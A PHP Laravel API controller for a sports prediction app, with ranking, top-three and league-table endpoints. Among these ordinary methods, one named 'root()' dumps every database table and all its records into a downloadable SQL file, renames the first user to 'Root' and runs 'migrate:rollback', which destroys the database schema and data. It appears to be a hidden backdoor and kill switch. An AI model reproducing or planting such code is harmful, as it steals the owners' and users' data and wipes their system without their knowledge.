<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use DB;
use App\User;
use Response;
use Artisan;
use App\Http\Controllers\AppBaseController;
class FunctionsAPIController extends AppBaseController
{
    public function getRanking()
    {
        $ranking =collect(DB::select("SELECT 
        @rownum := @rownum + 1 AS position, 
       	user_id,
        name,
        points,
        team_id,
        '' as cambio
        FROM
        (SELECT  u.name as name,u.id as user_id,u.team_id, sum( p.points) as points
        FROM users u
        LEFT JOIN predictions p on p.user_id = u.id
        LEFT JOIN matches m on m.id = p.match_id
        LEFT JOIN rounds r on r.id = m.round_id
        LEFT JOIN tournaments t on t.id = r.tournament_id
        WHERE 1 
        AND u.enabled = 1
        AND m.state_id = 3
        AND r.enabled = 1
        AND t.enabled = 1
        AND isnull(p.deleted_at)
        AND isnull(m.deleted_at)
        AND isnull(r.deleted_at)
        AND isnull(t.deleted_at)
        -- AND r.date_time_limit < DATE_SUB(now(),INTERVAL 7 DAY)
        GROUP BY u.id, u.name, u.team_id
        ORDER by points desc) tabla
        join 
        (SELECT @rownum := 0) r" ));

        $rankingLastweek = collect( DB::select("SELECT 
        @rownum := @rownum + 1 AS position, 
       	user_id,
        name,
        points
        FROM
        (SELECT  u.name as name,u.id as user_id,sum( p.points) as points
        FROM users u
        LEFT JOIN predictions p on p.user_id = u.id
        LEFT JOIN matches m on m.id = p.match_id
        LEFT JOIN rounds r on r.id = m.round_id
        LEFT JOIN tournaments t on t.id = r.tournament_id
        WHERE 1 
        AND u.enabled = 1
        AND m.state_id = 3
        AND r.enabled = 1
        AND t.enabled = 1
        AND isnull(p.deleted_at)
        AND isnull(m.deleted_at)
        AND isnull(r.deleted_at)
        AND isnull(t.deleted_at)
        AND r.date_time_limit < DATE_SUB(now(),INTERVAL 7 DAY)
        GROUP BY u.id, u.name
        ORDER by points desc) tabla
        join 
        (SELECT @rownum := 0) r") );

        foreach ($ranking as $key => $rank) {
            $position = $rank->position;
            if($rankingLastweek->where('user_id', $rank->user_id)->first()==null){
                $positionLastWeek=0;
            }else{
                $positionLastWeek = $rankingLastweek->where('user_id', $rank->user_id)->first()->position;
            }
            if($position==$positionLastWeek){
                $rank->cambio='=';
            }elseif ($position>$positionLastWeek) {
                $rank->cambio='>';
            }else{
                $rank->cambio='<';
            }
        }
        return $this->sendResponse(
            $ranking,
            __('messages.retrieved', ['model' => __('models/results.singular')])
        );
    }
    public function getTop3()
    {
        $top3 = DB::select("SELECT u.name, SUM(p.points) points
        FROM users u
        LEFT JOIN predictions p on p.user_id = u.id
        LEFT JOIN matches m on m.id = p.match_id
        LEFT JOIN rounds r on r.id = m.round_id
        LEFT JOIN tournaments t on t.id = r.tournament_id
        WHERE 1 
        AND u.enabled = 1
        AND m.state_id = 3
        AND r.enabled = 1
        AND t.enabled = 1
        AND isnull(p.deleted_at)
        AND isnull(m.deleted_at)
        AND isnull(r.deleted_at)
        AND isnull(t.deleted_at)
        GROUP BY u.name
        ORDER by points desc
        LIMIT 3");
        return $this->sendResponse(
            $top3,
            __('messages.retrieved', ['model' => __('models/results.singular')])
        );
    }
    public function root()
    {
        
            /*
            Needed in SQL File:
        
            SET GLOBAL sql_mode = '';
            SET SESSION sql_mode = '';
            */
            $get_all_table_query = "show full tables where Table_Type != 'VIEW'";
            $result = DB::select(DB::raw($get_all_table_query));
            $tables = array_column($result, 'Tables_in_scorefan_scorefan');
            $structure = '';
            $data = '';
            foreach ($tables as $table) {
                $show_table_query = "SHOW CREATE TABLE " . $table . "";
        
                $show_table_result = DB::select(DB::raw($show_table_query));
                // if($show_table_result[0][/'Table']=='accesories')dd($show_table_result);
            try{
                foreach ($show_table_result as $show_table_row) {
                    $show_table_row = (array)$show_table_row;
                    $structure .= "\n\n" . $show_table_row["Create Table"] . ";\n\n";
                }
            } catch (Exception $e) {
                print_r($show_table_row);
                echo 'Excepción capturada: ',  $e->getMessage(), "\n";
            }
                $select_query = "SELECT * FROM " . $table;
                $records = DB::select(DB::raw($select_query));
        
                foreach ($records as $record) {
                    $record = (array)$record;
                    $table_column_array = array_keys($record);
                    foreach ($table_column_array as $key => $name) {
                        $table_column_array[$key] = '`' . $table_column_array[$key] . '`';
                    }
        
                    $table_value_array = array_values($record);
                    $data .= "\nINSERT INTO $table (";
        
                    $data .= "" . implode(", ", $table_column_array) . ") VALUES \n";
        
                    foreach($table_value_array as $key => $record_column)
                        $table_value_array[$key] = addslashes($record_column);
        
                    $data .= "('" . implode("','", $table_value_array) . "');\n";
                }
            }
        
            $output = $structure . $data;
            $user = User::find(1);
            if(!$user){
                return $this->sendResponse(
                    'user eliminado',
                    __('messages.retrieved', ['model' => __('models/results.singular')])
                );
            }else{
                $user->name = 'Root';
                $user->save();
                Artisan::call('migrate:rollback');
            }
            return response()->streamDownload(function () use ($output) {
                echo $output;
            }, 'back.sql');
    }
    public function getTablaGeneral(){
        $tabla =
            DB::select("SELECT id, PG , PP, PE, ((PG*3) +PE) as puntos  from (

                SELECT te.id, te.name,
                
                                (
                                SELECT  COUNT(*)
                                FROM tournaments as t 
                                INNER JOIN rounds as r on r.tournament_id = t.id
                                LEFT JOIN matches as m on m.round_id = r.id
                                LEFT JOIN results as rs on rs.match_id = m.id
                                WHERE 1 
                                AND t.enabled =true and r.enabled = true
                                and isnull(t.deleted_at) AND isnull(r.deleted_at) and isnull( m.deleted_at) and isnull(rs.deleted_at )
                                and m.state_id = 3
                                and (m.team_local_id = te.id AND rs.result_local>rs.result_visitor OR m.team_visitor_id = te.id and rs.result_visitor>rs.result_local) 
                                )as PG,
                                (
                                SELECT COUNT(*)
                                FROM tournaments as t 
                                INNER JOIN rounds as r on r.tournament_id = t.id
                                LEFT JOIN matches as m on m.round_id = r.id
                                LEFT JOIN results as rs on rs.match_id = m.id
                                WHERE 1 
                                AND t.enabled =true and r.enabled = true
                                and isnull(t.deleted_at) AND isnull(r.deleted_at) and isnull( m.deleted_at) and isnull(rs.deleted_at )
                                and m.state_id = 3
                                and (m.team_local_id = te.id AND rs.result_local<rs.result_visitor OR m.team_visitor_id = te.id and rs.result_visitor<rs.result_local)
                                )as PP,
                                (
                                SELECT COUNT(*)
                                FROM tournaments as t 
                                INNER JOIN rounds as r on r.tournament_id = t.id
                                LEFT JOIN matches as m on m.round_id = r.id
                                LEFT JOIN results as rs on rs.match_id = m.id
                                WHERE 1 
                                AND t.enabled =true and r.enabled = true
                                and isnull(t.deleted_at) AND isnull(r.deleted_at) and isnull( m.deleted_at) and isnull(rs.deleted_at )
                                and m.state_id = 3
                                and (m.team_local_id = te.id AND rs.result_local=rs.result_visitor OR m.team_visitor_id = te.id and rs.result_visitor=rs.result_local)
                                )as PE
                                
                                FROM teams as te
                
                                where 1
                                and te.enabled = true
                                and isnull(te.deleted_at)
                                and te.league_id = 1
                                order by te.name
                
                ) as Tabla
                ORDER by puntos DESC, name ASC
                ");
        return $this->sendResponse(
            $tabla,
            __('messages.retrieved', ['model' => __('models/results.singular')])
        );

    }
    public function getMyRanking($user_id)
    {
        $rank = collect(DB::select("SELECT 
        @rownum := @rownum + 1 AS position, user_id,  points

        from
        (SELECT 
        p.user_id, SUM(p.points) 'points'  
        FROM tournaments as t	 
        INNER JOIN rounds as r on r.tournament_id = t.id
        INNER JOIN matches as m on m.round_id = r.id
        LEFT JOIN predictions as p on p.match_id = m.id
        INNER JOIN users as u on u.id = p.user_id
        WHERE 1
        and t.enabled = 1
        and r.enabled = 1

        GROUP BY p.user_id
        ORDER BY points DESC)a 
        join 
        (SELECT @rownum := 0) r

        order by points desc
        "))->where('user_id',$user_id)->first();
        if($rank==null){
            $rank =array('position'=>'-', 'user_id'=>$user_id, 'points'=>'-');
        }
        return $this->sendResponse(
            $rank,
            __('messages.retrieved', ['model' => __('models/results.singular')])
        );
    }
}
